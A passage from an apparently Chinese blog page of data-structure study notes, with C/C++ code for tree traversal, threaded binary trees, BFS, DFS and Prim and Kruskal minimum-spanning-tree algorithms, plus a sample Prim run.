&#123;</span><br><span class="line">InitQueue(Q);</span><br><span class="line">BiTree p;</span><br><span class="line">EnQueue(Q, T);</span><br><span class="line"><span class="keyword">while</span> (!Empty(Q)) &#123;</span><br><span class="line">DeQueue(Q, p);</span><br><span class="line">visit(p);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">EnQueue(Q, p-&gt;lchild);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">EnQueue(Q, p-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线索二叉树"><a class="markdownIt-Anchor" href="#线索二叉树">#</a> 线索二叉树</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>, *<span class="title">rchild</span>;</span></span><br><span class="line"><span class="type">int</span> ltag, rtag;</span><br><span class="line">&#125; ThreadNode, *ThreadTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序线索二叉树</span></span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree &amp;p, ThreadTree &amp;pre)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">InThread(p-&gt;lchild, pre);<span class="comment">//递归，线索化左子树</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild == <span class="literal">NULL</span>) &#123;<span class="comment">//左子树为空，建立前驱线索</span></span><br><span class="line">p-&gt;lchild = pre;</span><br><span class="line">p-&gt;ltag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; pre-&gt;rchild == <span class="literal">NULL</span>) &#123;</span><br><span class="line">pre-&gt;rchild = p; <span class="comment">//建立前驱节点的后继线索</span></span><br><span class="line">pre-&gt;rtag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pre = p;<span class="comment">//标记当前结点为刚刚访问过的结点</span></span><br><span class="line">InThread(p-&gt;rchild, pre);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreatInThread</span><span class="params">(ThreadTree T)</span> &#123;</span><br><span class="line">ThreadTree pre = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">InThead(T, pre);</span><br><span class="line">pre-&gt;rchild = <span class="literal">NULL</span>; <span class="comment">//处理遍历的最后一个结点</span></span><br><span class="line">pre-&gt;rtag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历"><a class="markdownIt-Anchor" href="#遍历">#</a> 遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//中序线索树的遍历</span></span><br><span class="line">ThreadNode *<span class="title function_">Firstnode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">p=p-&gt;lchild;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">ThreadNode *<span class="title function_">Nextnode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;rtag==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> Firstnode(p-&gt;rchild);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不含头结点的中序线索树的中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Inorder</span><span class="params">(ThreadNode *T)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(ThreadNode *p=Firstnode(T);p!=<span class="literal">NULL</span>;p=Nextnode(p))</span><br><span class="line">visit(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二-图"><a class="markdownIt-Anchor" href="#二-图">#</a> 二、图</h1><h2 id="bfs"><a class="markdownIt-Anchor" href="#bfs">#</a> BFS</h2><p>广度优先搜索<br>主要使用队列实现，对每个节点可能到达的路径进行入队出队判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> VertexType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> EdgeType;</span><br><span class="line"><span class="type">int</span> Max = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">VertexType Vex[MaxVertexNum];</span><br><span class="line">EdgeType EdgeType[MaxVertexNum][MaxVertexNum];</span><br><span class="line"><span class="type">int</span> vexnum, arcnum;</span><br><span class="line">&#125; Gragh;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BFS遍历</span></span><br><span class="line"><span class="type">bool</span> visited[MaxVertexNum];</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraverse</span><span class="params">(Graph G)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.vexnum; ++i)</span><br><span class="line">visited[i] = <span class="literal">false</span>;</span><br><span class="line">InitQueue(Q);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.vexnum; ++i)</span><br><span class="line"><span class="keyword">if</span> (!visited[i])</span><br><span class="line">BFS(G, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(Graph G, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">visit(v);</span><br><span class="line">visited[v] = <span class="literal">true</span>;</span><br><span class="line">Enqueue(Q, v);</span><br><span class="line"><span class="keyword">while</span> (!isEmpty(Q)) &#123;</span><br><span class="line">DeQueue(Q, v);</span><br><span class="line"><span class="keyword">for</span> (w = FirstNeighbor(G, v); w &gt;= <span class="number">0</span>; w = NextNeighbor(G, v, w))</span><br><span class="line"><span class="keyword">if</span> (!visited[w]) &#123;</span><br><span class="line">visit(w);</span><br><span class="line">visited[w] = <span class="literal">true</span>;</span><br><span class="line">EnQueue(Q, w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BFS求单源最短路径</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS_MIN_Distance</span><span class="params">(Graph G, <span class="type">int</span> u)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.vexnum; i++)</span><br><span class="line">d[i] = Max; <span class="comment">//初始化路径为无穷</span></span><br><span class="line">visited[u] = <span class="literal">true</span>;</span><br><span class="line">d[u] = <span class="number">0</span>;</span><br><span class="line">EnQueue(Q, u);</span><br><span class="line"><span class="keyword">while</span> (!isEmpty(Q)) &#123;</span><br><span class="line">DeQueue(Q, u);</span><br><span class="line"><span class="keyword">for</span> (w = FirstNeighbor(G, u); w &gt;= <span class="number">0</span>; w = NextNeighbor(G, u, w))</span><br><span class="line"><span class="keyword">if</span> (!visited[w]) &#123;</span><br><span class="line">visited[w] = <span class="literal">true</span>;</span><br><span class="line">d[w] = d[u] + <span class="number">1</span>;</span><br><span class="line">EnQueue(Q, w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dfs"><a class="markdownIt-Anchor" href="#dfs">#</a> DFS</h2><p>深度优先搜索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM];</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line">visited[v]=FALSE;</span><br><span class="line"><span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line"><span class="keyword">if</span>(!visited[v])</span><br><span class="line">DFS(G,v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">visit(v);</span><br><span class="line">visited[v]=TRUE;</span><br><span class="line"><span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,v,w))</span><br><span class="line"><span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">DFS(G,w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最小生成树"><a class="markdownIt-Anchor" href="#最小生成树">#</a> 最小生成树</h2><p>关于图的几个概念定义：</p><p>连通图：在无向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该无向图为连通图。<br>强连通图：在有向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该有向图为强连通图。<br>连通网：在连通图中，若图的边具有一定的意义，每一条边都对应着一个数，称为权；权代表着连接连个顶点的代价，称这种连通图叫做连通网。<br>生成树：一个连通图的生成树是指一个连通子图，它含有图中全部 n 个顶点，但只有足以构成一棵树的 n-1 条边。一颗有 n 个顶点的生成树有且仅有 n-1 条边，如果生成树中再添加一条边，则必定成环。<br>最小生成树：在连通网的所有生成树中，所有边的代价和最小的生成树，称为最小生成树。<br><img src="https://img-blog.csdnimg.cn/fdf5fd6eddf14303bd46908ad82e99db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>下面介绍两种求最小生成树算法</p><p>1.Kruskal 算法<br>此算法可以称为 “加边法”，初始最小生成树边数为 0，每迭代一次就选择一条满足条件的最小代价边，加入到最小生成树的边集合里。</p><p>把图中的所有边按代价从小到大排序；<br>把图中的 n 个顶点看成独立的 n 棵树组成的森林；<br>按权值从小到大选择边，所选的边连接的两个顶点 ui,viui,vi, 应属于两颗不同的树，则成为最小生成树的一条边，并将这两颗树合并作为一颗树。<br>重复 (3), 直到所有顶点都在一颗树内或者有 n-1 条边为止。<br><img src="https://img-blog.csdnimg.cn/fc55c29aced344ce87a732de52f532ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ol start="2"><li>Prim 算法<br>此算法可以称为 “加点法”，每次迭代选择代价最小的边对应的点，加入到最小生成树中。算法从某一个顶点 s 开始，逐渐长大覆盖整个连通网的所有顶点。</li></ol><p>图的所有顶点集合为 VV；初始令集合 u={s},v=V−uu={s},v=V−u;<br> 在两个集合 u,vu,v 能够组成的边中，选择一条代价最小的边 (u0,v0)(u0,v0)，加入到最小生成树中，并把 v0v0 并入到集合 u 中。<br>重复上述步骤，直到最小生成树有 n-1 条边或者 n 个顶点为止。<br>由于不断向集合 u 中加点，所以最小代价边必须同步更新；需要建立一个辅助数组 closedge, 用来维护集合 v 中每个顶点与集合 u 中最小代价边信息，：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> vertexData   <span class="comment">//表示u中顶点信息</span></span><br><span class="line">  UINT lowestcost   <span class="comment">//最小代价</span></span><br><span class="line">&#125;closedge[vexCounts]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d2ea71d69253474893ef97e8dfd6d1d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="prim算法"><a class="markdownIt-Anchor" href="#prim算法">#</a> Prim 算法</h3><p>最小生成树是一个图的极小连通子图，它包含原图的所有顶点，并且所有边的权值之和尽可能小。</p><p>Prim 算法就是图的最小生成树算法之一，Prim 算法是一种求解加权无向连通图的 MST 问题的贪心算法。它能找出一个边的子集，使得其构成的树包含图中所有顶点，且边的权值之和最小。</p><p>Prim 算法以图的顶点为基础，从首个初始顶点，寻找到达其他顶点权值最小的边，并把该顶点加入到 “ <code>已到达顶点</code> ” 的集合中，此时，这个集合就是这个图的最小生成树。</p><p>一般用一维数组比较方便表达最小生成树，数组下标所对应的元素，代表该顶点在最小生成树当中的父亲节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于Prim算法实现最小生成树</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1e7</span>;</span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; Init() &#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入带权无向图的定点数和边数(以空格隔开):&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; graph(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">1</span>, INF));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请依次输入&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;条边的开始节点，结束节点，权值(以空格隔开):&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="type">int</span> start, end, wet;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; start &gt;&gt; end &gt;&gt; wet;</span><br><span class="line">        graph[start][end] = wet;</span><br><span class="line">        graph[end][start] = wet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> graph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Prim</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt;&amp; c, <span class="type">int</span> u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = c.size() - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 定义数据结构lowcost[]，closest[]，s[]</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">lowcost</span><span class="params">(n+<span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">closest</span><span class="params">(n+<span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt; <span class="title function_">s</span><span class="params">(n+<span class="number">1</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 1.初始化lowcost[]，closest[]，s[]</span></span><br><span class="line">    s[u] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != u) &#123;</span><br><span class="line">            lowcost[i] = c[u][i];</span><br><span class="line">            closest[i] = u;</span><br><span class="line">            s[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            lowcost[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// n个节点之间需要找最短路径n-1次</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123; </span><br><span class="line">        <span class="comment">// 2.找最小</span></span><br><span class="line">        <span class="type">int</span> tmp = INF, t = u;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!s[j] &amp;&amp; (lowcost[j] &lt; tmp)) &#123;   <span class="comment">//!s[j]表示j节点V-U集合中</span></span><br><span class="line">                t = j;</span><br><span class="line">                tmp = lowcost[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找不到，跳出循环</span></span><br><span class="line">        <span class="keyword">if</span> (t == u) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将t加入集合U</span></span><br><span class="line">        s[t] = <span class="literal">true</span>;  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.更新</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((!s[j]) &amp;&amp; (c[t][j] &lt; lowcost[j])) &#123;</span><br><span class="line">                lowcost[j] = c[t][j];</span><br><span class="line">                closest[j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.打印最终结果</span></span><br><span class="line">    <span class="type">int</span> totalcost = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lowcost[]数组：&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; lowcost[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        totalcost += lowcost[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;closest[]数组：&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; closest[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> totalcost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test main()</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; graph = Init();</span><br><span class="line">    <span class="type">int</span> weight = Prim(graph, <span class="number">1</span>); <span class="comment">// 1表示从1开始找</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n最小生成树总的花费是：&quot;</span> &lt;&lt; weight &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验结果<br>请输入带权无向图的定点数和边数 (以空格隔开):<br>7 12<br> 请依次输入 12 条边的开始节点，结束节点，权值 (以空格隔开):<br>1 2 23<br>1 6 28<br>1 7 36<br>2 3 20<br>2 7 1<br>3 4 15<br>3 7 4<br>4 5 3<br>4 7 9<br>5 6 17<br>5 7 16<br>6 7 25<br>lowcost [] 数组：0 23 4 9 3 17 1<br>closest [] 数组：0 1 7 7 4 5 2</p><p>最小生成树总的花费是：57</p><p>D:\projects\test\x64\Release\test.exe (进程 1788) 已退出，返回代码为: 0。</p><h3 id="kruskal算法"><a class="markdownIt-Anchor" href="#kruskal算法">#</a> Kruskal 算法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment">CSDN 勿在浮沙筑高台 